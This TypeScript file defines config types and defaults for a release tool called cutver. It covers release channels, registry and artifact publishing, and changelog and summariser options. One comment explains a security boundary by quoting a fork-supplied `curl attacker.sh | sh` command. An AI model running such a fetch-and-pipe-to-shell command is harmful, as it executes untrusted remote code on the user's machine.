/**
 * What a `cutver.json` / `cutver.yml` means, as types and defaults.
 *
 * **The default is not a scatter of `??` fallbacks — it is a real `Config`.**
 * `DEFAULT_CONFIG` below is today's hard-coded behaviour written out, so a
 * repository with no config file and one with a config file take exactly the
 * same code path. That is what makes "zero config behaves as it always did"
 * something a test can prove rather than something a reviewer has to trust.
 */

export const SCHEMA_VERSION = 1

/** Anything wrong with the config itself: unreadable, unknown key, bad channel name. */
export class ConfigError extends Error {}

export const ECOSYSTEMS = ['cargo', 'node', 'bun'] as const
export type Ecosystem = (typeof ECOSYSTEMS)[number]

/**
 * The words the **pre-2.0** `publish` list accepted, kept only to validate one.
 *
 * **This is not the model any more.** `publish: [registry, artifacts]` answered
 * two unrelated questions in one key — does a tag reach the registry, and does
 * it attach files — so setting either meant restating the other. They are
 * `publish: boolean` and `artifacts:` now, and `publishesToRegistry` /
 * `producesArtifacts` are what callers ask.
 *
 * The list still parses so that no config written before 2.0 breaks for a
 * rename; `parsePublish` maps it onto the pair and records a warning. Both go
 * in 3.0, and this constant goes with them.
 */
export const PUBLISH_TARGETS = ['registry', 'artifacts'] as const
export type PublishTarget = (typeof PUBLISH_TARGETS)[number]

/**
 * The default when the config says nothing, keyed by adapter rather than
 * ecosystem because that is what every caller already has.
 *
 * **cargo defaults to artifacts, and js to the registry**, which is not
 * symmetry for its own sake. Publishing to crates.io *reserves the crate name
 * permanently* — ten members means ten names claimed by a workflow the author
 * ran to get version numbers. A Rust workspace is also far more often an
 * application than a library. npm has no reservation semantics of that kind and
 * a package.json almost always exists to be installed, so the safe default
 * differs by ecosystem the same way the risk does.
 */
export const DEFAULT_PUBLISH: Record<'js' | 'cargo', boolean> = {
  js: true,
  cargo: false,
}

/**
 * Whether a tag attaches build output when nothing says otherwise.
 *
 * The mirror of `DEFAULT_PUBLISH`, and it falls the other way for the same
 * reason: a Rust workspace's tags are usually there to carry executables, and a
 * JavaScript package's are usually there to reach npm. cargo also needs no
 * `artifacts:` block to do it, because `cargo metadata` names the binaries.
 */
export const DEFAULT_ARTIFACTS: Record<'js' | 'cargo', boolean> = {
  js: false,
  cargo: true,
}

/**
 * The reserved channel key: branches that cut a *stable* release.
 *
 * It lives in the same map as the prerelease channels because it is the same
 * question — "which branches mean this" — and because a separate top-level key
 * would let a branch appear in both without anything noticing.
 */
export const RELEASE = 'release'

/**
 * A channel name that is not the channel's name.
 *
 * `prerelease` reads as a category rather than a channel and plenty of projects
 * name the branch that; it resolved to `rc` in the branch-name rules from
 * 0.1.0-beta.9, and it resolves to `rc` as a config key too. Declaring both is
 * refused rather than merged — see `load.ts`.
 */
export const KEY_ALIASES: Record<string, string> = { prerelease: 'rc' }

/**
 * Channel names are kebab-case: lowercase words joined by single hyphens.
 *
 * A hyphen *inside* the identifier is safe, and that is worth stating because
 * the neighbouring rule looks like it forbids one. Measured on Bun 1.3.14:
 *
 *     1.2.0-my-prefix.9  <  1.2.0-my-prefix.10     correct
 *     1.2.0-rc-9         >  1.2.0-rc-10            INVERTED
 *
 * The difference is *where* the hyphen is. `my-prefix` is one alphanumeric
 * identifier and the counter is still its own dot-separated numeric one, so
 * precedence works. `rc-9` fuses the counter into the text, and then ten sorts
 * below nine. So the constraint is not "no hyphens" — it is "the counter keeps
 * its dot", which is a property of the format and not of the name.
 *
 * Digits are still out. They are legal semver, but they buy nothing here and
 * an all-digit identifier has leading-zero rules that would need their own
 * test; a name is not the place to spend that.
 */
export const CHANNEL_NAME = /^[a-z]+(?:-[a-z]+)*$/

/**
 * Normalise a channel key to kebab-case.
 *
 * `myPrefix`, `MyPrefix`, `my_prefix` and `my prefix` all name the same thing
 * as far as anyone reading the config is concerned, so they resolve to the same
 * channel rather than three of them being errors and one working. Normalising
 * once here is what keeps the version string, the git tag, the dist-tag and the
 * generated workflow arm from ever disagreeing about spelling.
 *
 * Two keys that normalise to the same channel are refused, not merged — see
 * `load.ts`. Silently merging two rules is how a branch ends up in a channel
 * nobody declared.
 */
export function toKebab(name: string): string {
  return (
    name
      .trim()
      // camelCase and PascalCase, including runs of capitals: `HTTPServer` has
      // to break as `http-server`, not `h-t-t-p-server`.
      .replace(/([a-z0-9])([A-Z])/g, '$1-$2')
      .replace(/([A-Z]+)([A-Z][a-z])/g, '$1-$2')
      .replace(/[_\s]+/g, '-')
      .toLowerCase()
      .replace(/-+/g, '-')
      .replace(/^-|-$/g, '')
  )
}

/**
 * How many release sections a compiled changelog keeps.
 *
 * **Trimmed, not regenerated.** A file that grows for the life of a project is
 * the reason nobody scrolls to the bottom of one, so the tail is dropped and
 * pointed at instead. The alternative — rebuilding the whole file from the tags
 * on every release — can only ever reproduce what is *still* in the history, so
 * a squash, a rebase or a shallow clone would silently rewrite what an old
 * release said. Trimming touches only the end; regenerating touches everything,
 * including releases whose notes are already public on a GitHub release page.
 */
export const DEFAULT_KEEP = 10

export interface ChangelogConfig {
  /** Section keys, in reading order. */
  sections: string[]
  /**
   * Whether cutver writes `CHANGELOG.md` at all. `true` by default.
   *
   * **`false` splits the two halves of this feature, which have no reason to
   * be one decision.** Turning `changelog:` on means cutver owns the file: it
   * is rewritten whole on every release and edits do not survive. That is the
   * right trade for a project happy to have its notes compiled, and a
   * non-starter for one whose changelog is prose somebody wrote — which is
   * most projects that have kept one for a year.
   *
   * With `file: false` nothing in the tree is touched and everything else
   * still works: sections are compiled for the GitHub release body, `notes`
   * answers from the commit range, and `--overwrite` fills the pages. The
   * hand-written changelog stays hand-written.
   */
  file: boolean
  /** Release sections retained in the file. `null` keeps every one. */
  keep: number | null
  /**
   * Whether prereleases get their own heading. `false` by default.
   *
   * **A prerelease is a step toward a release, not a release.** `latest` never
   * pointed at `0.1.0-beta.9`, nobody installed it on purpose, and everything
   * in it ships again under the stable version that follows — so a heading for
   * it describes a version its reader cannot get and spends one of `keep`'s
   * slots doing it. Measured on this repository when the default was chosen:
   * five of the ten kept sections were betas. (It is none of ten now — fourteen
   * stable releases have shipped since, which is what a full `keep` window
   * looks like once a project stops living in prerelease. The ratio moves; the
   * reason a beta heading is worth nothing does not.)
   *
   * **Excluding them widens the ranges rather than dropping the commits**, and
   * that is the part worth stating. A stable release's span runs from the
   * previous *stable* tag, absorbing every prerelease between — otherwise
   * removing the headings would silently delete their contents. On this
   * repository `v1.0.0` covers 2 commits measured from `v0.1.0-beta.12`, and 41
   * measured from the last stable point — which for the first stable release is
   * the root commit. The same distinction already exists in
   * `plan.ts`, which asks "any tag" to decide *whether* to release and "last
   * stable tag" to decide *from what*.
   *
   * `true` restores a heading per prerelease, each measured from whatever tag
   * came before it.
   */
  prereleases: boolean
  /**
   * Where the **release body** goes to be rewritten, or `null` to send it
   * nowhere.
   *
   * **Writing this is the opt-in; there is no separate switch.** It used to sit
   * at the top level next to a `changelog.summarize: true` that turned it on,
   * which is two keys for one decision — set either alone and nothing happened,
   * and `doctor` had to grow a check for exactly that. Nesting it here says the
   * one thing that was ever being said: this is what rewrites the release body.
   *
   * `true` means the command in `CUTVER_SUMMARIZE` rather than a provider, and
   * **that split is a security boundary rather than a style choice.** A command
   * written in `cutver.yml` is a command in a *tracked file*, and
   * `gh pr checkout` brings a fork's tracked files into your working tree — so
   * a pull request could ship `curl attacker.sh | sh` and have it run the next
   * time a maintainer produced release notes. An environment variable cannot be
   * set by a pull request. The repository declares the intent, which is
   * reviewable and belongs in version control; the machine supplies the
   * command, which does not.
   *
   * A mapping names a provider instead, and carries no key for the same reason
   * — see `SummarizerConfig`.
   *
   * `CHANGELOG.md` is never summarised whatever this says, and that asymmetry
   * is the design. The file in the repository keeps exactly what the author
   * wrote — a paraphrase of "the collect step asks cargo rather than naming
   * them" can be subtly false, and a changelog is published. The release page
   * gets the readable version, where being slightly loose costs nothing and a
   * summary is what people actually want.
   *
   * It also means this never needs a cache. The body is written once, at
   * publish time, and stored by GitHub for good — so nothing recomputes it,
   * nothing goes stale, and a rate limit measured in requests per hour cannot
   * be reached by something that runs once per release.
   */
  summarizer: SummarizerConfig | true | null
  /**
   * The instruction sent ahead of the notes, or `null` for `DEFAULT_PROMPT`.
   *
   * **In the config, unlike the command, and the difference is what each one
   * is.** A command is executed; a prompt is data on a model's stdin. A fork
   * that edits this can at worst make a summary read oddly — and only on a
   * machine that already has `CUTVER_SUMMARIZE` set, which a pull request
   * cannot do. Nothing here reaches a shell.
   *
   * So it belongs where it can be tuned and reviewed. A prompt is the part of
   * this that needs adjusting against a particular model, it wants a diff when
   * it changes, and it must survive `cutver init --force` — an earlier version
   * baked it into the generated workflow, where a regeneration would have
   * silently thrown away a prompt tuned over three releases.
   */
  prompt: string | null
}

/**
 * Where the summariser sends the notes, when it is not a local command.
 *
 * **Separate from `changelog`, because they answer different questions.**
 * `changelog.summarizer` is the repository saying it wants a summarised release
 * body — reviewable, and true whoever runs the release. This is the wiring, and
 * a fork is free to point it somewhere else without that meaning anything.
 */
export interface SummarizerConfig {
  /** `anthropic`, `openai-compatible` or `gemini`. */
  connector: string
  /** Passed through verbatim. cutver keeps no list of model names — it would be stale within the month. */
  model: string
  // **There is deliberately no `token` field**, and this is a note about the
  // interface rather than about the field below it.
  //
  // An earlier draft had one holding the *name* of an environment variable,
  // with a validator refusing anything that looked like a real key. That works,
  // and it is still a field whose whole job is to be filled in wrong once:
  // `cutver.yml` is tracked, pushed, and shipped inside the npm tarball, so a
  // key pasted there is a key published — and unlike a leaked command it cannot
  // be made safe by review, only rotated.
  //
  // A field that does not exist cannot be filled in wrong. The key is resolved
  // from the environment by connector — see `keyFor` in `connectors.ts`.
  /**
   * Required for `openai-compatible`, optional elsewhere.
   *
   * No default for the compatible connector on purpose: its reason to exist is
   * pointing somewhere other than OpenAI, and defaulting would send a
   * repository's notes to a provider it never named.
   */
  baseUrl: string | null
  /**
   * Minutes to wait before trying once more, or `null` for a single attempt.
   *
   * **For rate limits, which are the failure worth waiting out.** Every
   * provider's free tier meters tokens per *minute*, so a release that lands
   * while something else is using the same key fails on a window that refills
   * on its own. Waiting a minute costs a minute; not waiting costs the summary.
   *
   * Only retryable failures are retried — a 429, a 5xx, a timeout, a dropped
   * connection. A wrong model name or a rejected key returns the same answer
   * however long you wait, and sleeping on one turns a clear error into a slow
   * one.
   *
   * `false` is the default. cutver cannot know whose key this is or what else
   * is spending it, and a release step that silently takes minutes longer than
   * the last one is not a good surprise.
   */
  retry: number | null
  /**
   * Send whole commit bodies rather than the first paragraph of each. On by
   * default.
   *
   * **The model reads more than the release shows, because it is asked to do
   * more with it.** A rendered section is one paragraph per commit — the thesis,
   * which is what a changelog wants. Splitting a commit that describes several
   * changes needs the paragraphs the thesis leaves behind, and it cannot split
   * what it never received.
   *
   * `false` sends the rendered section instead: cheaper, and enough for a
   * project whose commit bodies are a line each. It also turns the splitting
   * off, which is the point of saying so here rather than inferring it.
   */
  withBody: boolean
}

/**
 * `folders: auto` / `files: auto` — let the build output be found rather than
 * named.
 *
 * **Resolved on the runner, not at `init` time**, and that is the whole reason
 * it can work. Nothing has been built when the workflow is written, so a
 * generated file cannot know whether this project emits `dist/` or `out/`; the
 * collect step probes for them after the build has run, which is the one moment
 * the answer exists.
 */
export const AUTO = 'auto'

/**
 * Where a JavaScript build is looked for under `auto`, in order.
 *
 * Conventional rather than clever. A project using none of these names is a
 * project that should say which it uses — guessing harder would mean shipping
 * whatever happened to be lying in the tree.
 */
export const AUTO_DIRS = ['dist', 'build', 'out'] as const

/**
 * What goes on the release page, for repositories whose build output cutver
 * cannot infer.
 *
 * **A Rust workspace declares its binaries and a JavaScript project does not.**
 * `cargo metadata` names every executable a workspace builds, which is why the
 * cargo job can collect them without being told. Nothing in a `package.json`
 * says whether the thing worth publishing is a compiled executable, a tarball,
 * a folder of assets, or nothing at all — so the generated job hard-coded
 * `dist/*` and a comment asking you to put your output there. A project that
 * builds into `out/`, or wants one file out of twenty, had to edit a generated
 * workflow that `--force` then overwrites.
 *
 * This block says *what to attach*, not how to make it. The build step stays
 * the ecosystem's own — `bun run build`, `npm run build`, the cargo matrix —
 * because that is a command someone already has, and a second place to write it
 * is a second place for it to disagree with package.json.
 */
export interface ArtifactsConfig {
  /**
   * Directory globs, or `auto`. Each match is archived to `<name>.tar.gz` and
   * attached as one asset.
   *
   * Archived rather than uploaded file-by-file, because that is the only thing
   * that distinguishes this from `files` — and a release page carrying two
   * hundred loose assets from one `dist/` is not what anyone means.
   */
  folders: string[] | typeof AUTO
  /** File globs, or `auto`. Each match is attached as its own asset, named as it is. */
  files: string[] | typeof AUTO
}

export interface Config {
  /** Config schema version — not the project's. */
  schema: number
  /** Which ecosystem this repository releases; `null` means "detect, as today". */
  target: Ecosystem | null
  /** Branch patterns keyed by what they produce. Includes `release`. */
  channels: Record<string, string[]>
  /**
   * Which channel keys the file actually wrote, as opposed to inherited.
   *
   * An unmentioned channel keeps its default, so `channels` alone cannot tell
   * the two apart — and one place needs to. `release: ['**']` is the built-in
   * meaning "no branch gating configured"; turning that into a workflow trigger
   * would wake CI on every branch in the repository. Testing "is there a config
   * file at all" got this wrong the moment someone added `cutver.yml` for
   * `changelog:` and never mentioned channels.
   */
  declaredChannels: string[]
  /** Whether a tag publishes to the registry. `null` means the ecosystem decides. */
  publish: boolean | null
  /** Spellings that still work and should not, said once by whoever runs. */
  warnings: string[]
  /**
   * How to compile the changelog, or `null` to write nothing under the heading.
   *
   * `null` is the default — the behaviour every release before this had, and
   * the one the rest of this tool argues for.
   */
  changelog: ChangelogConfig | null
  /** What a tag attaches to its release, when it attaches anything. */
  artifacts: ArtifactsConfig | false | null
  /** Where it was loaded from, for `explain`. `null` when nothing was found. */
  source: string | null
}

/**
 * Whether a tag publishes to the ecosystem's registry.
 *
 * **`publish` used to be a list, and the list was the problem.** It named two
 * unrelated decisions — reach the registry, and attach files — so turning one
 * on meant restating the other, and once `artifacts:` existed to say *which*
 * files, two keys were arguing over the same switch. `publish` answers one
 * question now, `artifacts` answers the other, and neither has to know about
 * the other's answer.
 */
export function publishesToRegistry(
  adapter: 'js' | 'cargo',
  config: Config,
): boolean {
  return config.publish ?? DEFAULT_PUBLISH[adapter]
}

/**
 * Whether a tag attaches build output to its release.
 *
 * The `artifacts:` block decides when it is there. Absent, the ecosystem does:
 * a cargo workspace attaches its binaries, a JavaScript package attaches
 * nothing until it says what.
 */
export function producesArtifacts(
  adapter: 'js' | 'cargo',
  config: Config,
): boolean {
  // Three states, and `false` is the reason they are not two. `null` is "not
  // mentioned", where the ecosystem decides; `false` is somebody saying no,
  // which has to beat a default that would have said yes.
  if (config.artifacts === null) return DEFAULT_ARTIFACTS[adapter]
  return config.artifacts !== false
}

/**
 * Today's behaviour, written out.
 *
 * Every entry here reproduces something the hard-coded rules already do:
 *
 * - `release: ['**']` — **any** branch may cut a stable release, which is the
 *   current behaviour and must stay it. Writing a `release` list is the opt-in
 *   to strictness; if this were `[main, master]` then upgrading cutver would
 *   silently stop releases on `develop` for everyone already using it.
 * - the bare channel names reproduce `channelFromBranch`,
 * - the `{version}-…` patterns reproduce `versionFromBranch`,
 * - `prerelease` under `rc` is where both alias tables went.
 *
 * `release/` is stripped from a branch before matching, so there are no
 * `release/beta` entries here — that prefix is handled once, in `match.ts`.
 */
export const DEFAULT_CONFIG: Config = {
  schema: SCHEMA_VERSION,
  target: null,
  channels: {
    [RELEASE]: ['**'],
    alpha: ['alpha', '{version}-alpha'],
    beta: ['beta', '{version}-beta'],
    rc: ['rc', 'prerelease', '{version}-rc', '{version}-prerelease'],
  },
  declaredChannels: [],
  publish: null,
  changelog: null,
  artifacts: null,
  warnings: [],
  source: null,
}

/** The prerelease channels, in the order they should be reported. `release` excluded. */
export function channelNames(config: Config): string[] {
  return Object.keys(config.channels).filter(c => c !== RELEASE)
}
